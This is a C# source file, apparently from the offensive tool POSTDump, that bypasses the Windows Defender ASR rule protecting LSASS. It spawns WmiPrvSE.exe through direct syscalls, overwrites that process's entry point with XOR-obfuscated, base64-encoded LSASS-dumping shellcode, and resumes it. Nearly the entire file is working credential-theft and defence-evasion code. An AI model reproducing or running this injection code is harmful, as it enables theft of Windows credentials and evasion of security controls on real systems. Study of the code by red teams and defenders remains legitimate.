// This is a bypass to dump LSASS with ASR rules enabled "Block credential stealing from the Windows local security authority subsystem (lsass.exe)"
// To enable the ASR rule: Set-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enable
using System;
using System.Runtime.InteropServices;
using Data = POSTMiniDump.Data;

namespace POSTDump
{
    public class ASR
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlCreateProcessParametersEx(ref IntPtr processParameters, ref Data.UNICODE_STRING imagePathName, IntPtr dllPath, IntPtr currentDirectory, IntPtr commandLine, IntPtr environment, IntPtr windowTitle, IntPtr desktopInfo, IntPtr shellInfo, IntPtr runtimeData, uint flags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate UInt32 NtCreateUserProcess(ref IntPtr ProcessHandle, ref IntPtr ThreadHandle, uint ProcessDesiredAccess, uint ThreadDesiredAccess, IntPtr ProcessObjectAttributes, IntPtr ThreadObjectAttributes, UInt32 ProcessFlags, UInt32 ThreadFlags, IntPtr ProcessParameters, ref PS_CREATE_INFO CreateInfo, ref PS_ATTRIBUTE_LIST AttributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, int pic, ref Data.PROCESS_BASIC_INFORMATION pbi, UInt32 cb, ref UInt32 pSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, int bytesToRead, ref uint bytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength, out UInt32 BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 NtResumeThread(IntPtr ThreadHandle, ref uint SuspendCount);

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_CREATE_INFO
        {
            public UIntPtr Size;
            public uint State;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 76)]
            public byte[] unused;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE
        {
            public ulong Attribute;
            public ulong Size;
            public IntPtr Value;
            public IntPtr ReturnLength;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE_LIST
        {
            public UIntPtr TotalLength;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public PS_ATTRIBUTE[] Attributes;
        }

        private static byte[] dec(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            int keypos = 0;
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[keypos]);
                keypos++;
                if (keypos == key.Length) { keypos = 0; }
            }

            return decrypted;
        }

        public static bool Run()
        {
            var imagePath = new Data.UNICODE_STRING();
            POSTMiniDump.Utils.RtlInitUnicodeString(ref imagePath, @"\??\C:\Windows\System32\wbem\WmiPrvSE.exe");

            var processParams = IntPtr.Zero;
            var status = RtlCreateProcessParametersEx(ref processParams, ref imagePath, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0x01);
            if (status != 0)
            {
                Console.WriteLine("RtlCreateProcessParametersEx failed");
                return false;
            }

            var ci = new PS_CREATE_INFO();
            ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
            ci.State = 0;
            ci.unused = new byte[76];

            var attribute = new PS_ATTRIBUTE();
            var attributeList = new PS_ATTRIBUTE_LIST();
            attributeList.TotalLength = (UIntPtr)40; // this is sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE) 
            attributeList.Attributes = new PS_ATTRIBUTE[2];

            attributeList.Attributes[0].Attribute = 0x20005;
            attributeList.Attributes[0].Size = imagePath.Length;
            attributeList.Attributes[0].Value = imagePath.Buffer;

            var hProcess = IntPtr.Zero;
            var hThread = IntPtr.Zero;

            NtCreateUserProcess NTCP = (NtCreateUserProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtCreateUserProcess"), typeof(NtCreateUserProcess));
            uint res = NTCP(ref hProcess, ref hThread, 0x001F0FFF, 0x001F0FFF, IntPtr.Zero, IntPtr.Zero, 0, 0x00000001, processParams, ref ci, ref attributeList);
            if (status != 0)
            {
                Console.WriteLine("NtCreateUserProcess failed");
                return false;
            }

            Data.PROCESS_BASIC_INFORMATION bi = new Data.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            NtQueryInformationProcess NTQP = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtQueryInformationProcess"), typeof(NtQueryInformationProcess));
            NTQP(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            uint nRead = 0;

            ISyscall.NtReadVirtualMemory NTRVM = (ISyscall.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntreadptr, typeof(ISyscall.NtReadVirtualMemory));
            NTRVM(hProcess, ptrToImageBase, addrBuf, (uint)addrBuf.Length, ref nRead);
            IntPtr WmiPrvSEBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            NTRVM(hProcess, WmiPrvSEBase, data, (uint)data.Length, ref nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)WmiPrvSEBase);

            // https://osandamalith.com/2019/05/11/shellcode-to-dump-the-lsass-process/
            // This shellcode is for Windows 10 and Server 2019 x86_64.
            // Tested also on Windows 11 x64.
            byte[] buf1 = Convert.FromBase64String("KBsNNgkDAw09POiiMgHPlh0bvZkl9qt8ILeEL8u6bBPvnk0d6rFFL7+Sb1psdSLWqhMFkYttQlpsPJSdIMulJQHRsU4liqocnottZkhSC9mfYiOiqF5MZkgawas7Pei8MwDPp34bwbEpPZScIculMwHRqmIkgqoOaUhML7edC9mUXiKiqAZMZkgbtZ0sdWtVIMulKAHRskckiqoc6rd+LsujCRPvhTscnol1ZkhSC6WtPOikUwC7p2tSQlol9pRvIMuNcQHRrQUl9oBpILeMJxMTGhs1NDQMgFNPZkiejpYk/DdxYQDFEmxCFRLvmXswIcNIQyhSQlrnhCPeOVAA7QJCD9EtRSbQqUfI3khSQhtjZSoNICsMWgXZSxjn6WvdaUhMVZqhTSVoUe6OHZwE7Ux2CpuEZS9a3pgJ45omYhLnOU9dLMOWp4JfwmMNetVUFUvPpKhRkhKTtCKqoj2kK8VGWmmlNOAvSQFPnglrCEIa5eBKLHuXLsUtRhNvrSqUokVD2EsavZkodrPVErdME6UTz15/Tq0hZLeNJ3MYWii9nDeqlrcN7Qp2QZMldqta3kxNJ8MYXpuMdyPNIEuM7UxTC1msnmlmqQDHOmxyCtEYUUMd6oxcOYuejpYsIDgDPgkYJx0TFBs7Peb5TWCzmbcaw7a0dGtVWogE6zXy+2ptdWumww1/kPEeNXxrsi7VAi0+CI8Xxj8ARlmSLMBiAiQ+BtIZ+awRTTgoBC8xhR5IAQQnDGaLImwqJjYAdawRTSgiEiw+hR5IEQd7DSQqoQx2KjZssi9xOSQ/BzuVBn44BkUxBC6LImwKMlqrMU8VBTstFY8WZh4fWw4tD48IQgA3QpzpVWpVaSmkN7atvRLhOOsd4rCzsQDfDn4cirwd5ARoBreF+9pVa/m9WbazmfGItIAjPeClgWuymbfrZfOEEiPekaBamLet+9c+dNYd4pCkb7atveMYBOaJJcOsjrSvvaXVwRjYiwTHnqC9v6WTzIXA3xgA7aC6oKeTitJovoAiLsHXcltsdYOElLez3zJLNTAk/C7FgYuxmbcez9dEdGtVKMUCcg1hguhtirsZSDxoVgDfDn48MFicLHuM3EhSQkqrMU996UhMZo8WZnpudWtVlp9/tADbx2JtdWvYI0qzsADfF/qrMMtlaEhMLsOaCtGUirhmss2MEnm5XhLhIMsd4ocNmZwazw+gPebYSUlMZgmtlx7nAMMd5BxoJgDfz3ptdWsUlp/Jpj2DB9GqRrnslrdTZrfHcltsdSfe7HBNZkgaywZIRSPeoQn1ZEhSQhvnoyPcNWxkLsEOZnqTIPsd6IyUZ0hSAwUtKyoIKBQTOBMPgZY6PeChIcuolgDRrnqEppaqlgDHgBaR");
            byte[] k = Convert.FromBase64String("aUhMZkhSQlpsdWtV");
            byte[] buf2 = dec(buf1, k);

            IntPtr RegSize = (IntPtr)buf2.Length;
            IntPtr addr = addressOfEntryPoint;
            ISyscall.NtProtectVirtualMemory NTP = (ISyscall.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntprotptr, typeof(ISyscall.NtProtectVirtualMemory));
            NTP(hProcess, ref addressOfEntryPoint, ref RegSize, 0x04, out uint old);

            IntPtr buffer = Marshal.AllocHGlobal(buf2.Length);
            Marshal.Copy(buf2, 0, buffer, buf2.Length);
            ISyscall.NtWriteVirtualMemory NTW = (ISyscall.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntwriteptr, typeof(ISyscall.NtWriteVirtualMemory));
            NTW(hProcess, addr, buffer, (uint)buf2.Length, out nRead);
            if (nRead == 0)
            {
                Console.WriteLine("Write failed");
                return false;
            }
            NTP(hProcess, ref addressOfEntryPoint, ref RegSize, old, out uint _);

            NtResumeThread NTRT = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtResumeThread"), typeof(NtResumeThread));
            uint s = 0;
            NTRT(hThread, ref s);

            return true;
        }
    }
}
